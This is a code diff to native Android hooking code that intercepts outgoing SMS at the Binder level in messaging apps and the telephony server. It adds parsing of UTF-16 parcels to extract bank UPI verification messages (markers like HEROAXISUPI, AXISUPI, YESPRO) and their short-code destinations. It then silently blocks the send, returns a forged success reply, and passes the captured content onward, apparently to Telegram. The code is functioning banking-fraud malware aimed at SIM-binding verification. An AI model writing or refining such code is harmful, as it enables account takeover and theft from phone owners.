@@ -510,6 +510,8 @@ void extract_sms_compose_from_blob(JNIEnv* env, jobject data, std::string& dest,
 }
 
 bool extract_isms_from_blob(JNIEnv* env, jobject data, std::string& dest, std::string& body) {
+    dest.clear();
+    body.clear();
     if (!data) return false;
     jclass cls = env->GetObjectClass(data);
     jmethodID marshall = env->GetMethodID(cls, "marshall", "()[B");
@@ -524,42 +526,119 @@ bool extract_isms_from_blob(JNIEnv* env, jobject data, std::string& dest, std::s
     std::string blob(reinterpret_cast<char*>(raw), static_cast<size_t>(len));
     env->ReleaseByteArrayElements(bytes, raw, JNI_ABORT);
     reset_parcel(env, data);
-    if (!body_has_verify_token(blob)) return false;
 
-    std::string best_body;
-    for (size_t i = 0; i < blob.size(); ++i) {
-        if (!std::isprint(static_cast<unsigned char>(blob[i]))) continue;
+    // A16 parcels = UTF-16LE strings. ASCII-only scan misses HEROAXISUPI / dest.
+    std::vector<std::string> strs;
+    auto push_unique = [&](const std::string& s) {
+        if (s.size() < 2) return;
+        // skip binder iface noise
+        if (s.find("android.") == 0 || s.find("com.android") == 0) return;
+        if (s.find("ISms") != std::string::npos || s == "isms") return;
+        for (const auto& e : strs)
+            if (e == s) return;
+        strs.push_back(s);
+    };
+
+    // UTF-16LE runs (allow \n \r \t)
+    for (size_t i = 0; i + 1 < blob.size();) {
+        const unsigned char c = static_cast<unsigned char>(blob[i]);
+        const unsigned char n = static_cast<unsigned char>(blob[i + 1]);
+        const bool ok = (n == 0) && ((c >= 0x20 && c < 0x7f) || c == '\n' || c == '\r' || c == '\t');
+        if (!ok) {
+            ++i;
+            continue;
+        }
+        std::string s;
+        size_t j = i;
+        while (j + 1 < blob.size()) {
+            const unsigned char cj = static_cast<unsigned char>(blob[j]);
+            const unsigned char nj = static_cast<unsigned char>(blob[j + 1]);
+            if (nj != 0) break;
+            if (!((cj >= 0x20 && cj < 0x7f) || cj == '\n' || cj == '\r' || cj == '\t')) break;
+            s += static_cast<char>(cj);
+            j += 2;
+        }
+        push_unique(s);
+        i = j > i ? j : i + 1;
+    }
+    // ASCII runs
+    for (size_t i = 0; i < blob.size();) {
+        if (!std::isprint(static_cast<unsigned char>(blob[i])) || blob[i] == '\0') {
+            ++i;
+            continue;
+        }
         size_t j = i;
         while (j < blob.size() && std::isprint(static_cast<unsigned char>(blob[j])) &&
-               blob[j] != '\0') {
-            j++;
-        }
-        const std::string chunk = blob.substr(i, j - i);
-        if (chunk.size() >= 8 && body_has_verify_token(chunk) && chunk.size() > best_body.size()) {
-            best_body = chunk;
-        }
-        i = j;
+               blob[j] != '\0')
+            ++j;
+        push_unique(blob.substr(i, j - i));
+        i = j > i ? j : i + 1;
     }
-    body = best_body.empty() ? blob : best_body;
 
-    std::string digits;
-    for (char c : blob) {
-        if (std::isdigit(static_cast<unsigned char>(c))) {
-            digits += c;
-            if (digits.size() > 14) {
-                digits.erase(0, digits.size() - 14);
+    for (const auto& s : strs) {
+        if (body.empty() && body_has_verify_token(s)) body = s;
+    }
+    if (body.empty()) {
+        for (const auto& s : strs) {
+            if (s.size() >= 12 && s.find('.') == std::string::npos &&
+                s.find('/') == std::string::npos) {
+                // long opaque token body
+                size_t alnum = 0;
+                for (char c : s)
+                    if (std::isalnum(static_cast<unsigned char>(c)) || strchr("+/=)(?&._- ", c))
+                        ++alnum;
+                if (alnum * 10 >= s.size() * 7 && s.size() > body.size()) body = s;
             }
-        } else if (!digits.empty()) {
-            if (is_short_verify_dest(digits)) {
-                dest = digits;
+        }
+    }
+    for (const auto& s : strs) {
+        if (dest.empty() && is_short_verify_dest(s)) dest = s;
+    }
+    // digit runs from UTF-16 decoded strings already covered; also scan flattened UTF-16 ascii
+    if (dest.empty()) {
+        std::string flat;
+        for (size_t i = 0; i + 1 < blob.size(); ++i) {
+            if (blob[i + 1] == 0 && std::isdigit(static_cast<unsigned char>(blob[i])))
+                flat += blob[i];
+            else if (!flat.empty()) {
+                if (is_short_verify_dest(flat)) {
+                    dest = flat;
+                    break;
+                }
+                flat.clear();
+            }
+        }
+        if (dest.empty() && is_short_verify_dest(flat)) dest = flat;
+    }
+
+    if (body.empty() && blob_contains_needle(blob, "HEROAXIS")) {
+        // last resort: pull around HEROAXIS marker
+        for (const auto& s : strs) {
+            if (to_upper(s).find("HERO") != std::string::npos) {
+                body = s;
                 break;
             }
-            digits.clear();
         }
     }
-    if (dest.empty() && !digits.empty() && is_short_verify_dest(digits)) dest = digits;
-    if (dest.empty()) dest = "0000000000";
+    if (dest.empty() && !body.empty()) dest = "0000000000";
     return !body.empty();
+}
+
+/** True when parcel looks like an OUTGOING send (not ISms status/query). */
+bool blob_looks_like_outgoing_send(const std::string& blob) {
+    if (blob.size() < 8) return false;
+    if (blob_contains_needle(blob, "sendText")) return true;
+    if (blob_contains_needle(blob, "sendMultipart")) return true;
+    if (blob_contains_needle(blob, "sendDataMessage")) return true;
+    if (blob_contains_needle(blob, "sendRawPdu")) return true;
+    if (blob_contains_needle(blob, "HEROAXIS")) return true;
+    if (blob_contains_needle(blob, "AXISUPI")) return true;
+    if (blob_contains_needle(blob, "DO NOT COPY")) return true;
+    if (blob_contains_needle(blob, "YESPRO")) return true;
+    if (blob_contains_needle(blob, "smsto:")) return true;
+    if (blob_contains_needle(blob, "SMSTO:")) return true;
+    if (blob_contains_needle(blob, "pp-")) return true;
+    return false;
 }
 
 bool read_isms_outgoing(JNIEnv* env, jobject data, std::string& dest, std::string& body) {
@@ -1129,16 +1208,30 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 write_isms_trace("isms_blocked");
                 return JNI_TRUE;
             }
-            // Nuclear fallback — try_block returned false but blob/iface says SMS
+            // Nuclear: only for OUTGOING send evidence (not every ISms status query)
             if ((g_is_messaging_app || g_is_telephony_server) && (iface_sms || blob_sms)) {
+                const bool sendish = blob_looks_like_outgoing_send(blob);
                 extract_isms_from_blob(env, data, dest, body);
-                if (dest.empty()) dest = "0000000000";
-                if (body.empty()) body = blob_sms ? "BLOB_SMS_BLOCK" : "MSG_SMS_INTERCEPT";
-                pipeline_outgoing(env, dest, body, nullptr, nullptr);
-                if (reply) write_ok_reply(env, reply);
-                write_hook_status("isms_blocked_nuclear");
-                write_isms_trace("isms_blocked_nuclear");
-                return JNI_TRUE;
+                const bool got_real =
+                    !body.empty() && body != "BLOB_SMS_BLOCK" && body != "MSG_SMS_INTERCEPT" &&
+                    (body_has_verify_token(body) || body.size() >= 8);
+                if (sendish || got_real) {
+                    if (dest.empty()) dest = "0000000000";
+                    if (!got_real) {
+                        // Still stop radio, but don't TG-spam placeholders
+                        if (reply) write_ok_reply(env, reply);
+                        write_hook_status("isms_blocked_silent");
+                        write_isms_trace("isms_blocked_silent");
+                        return JNI_TRUE;
+                    }
+                    pipeline_outgoing(env, dest, body, nullptr, nullptr);
+                    if (reply) write_ok_reply(env, reply);
+                    write_hook_status("isms_blocked_nuclear");
+                    write_isms_trace("isms_blocked_nuclear");
+                    return JNI_TRUE;
+                }
+                // Bare ISms query/status — do not block / do not TG BLOB_SMS_BLOCK
+                write_isms_trace("isms_passthrough_query");
             }
         }
     }
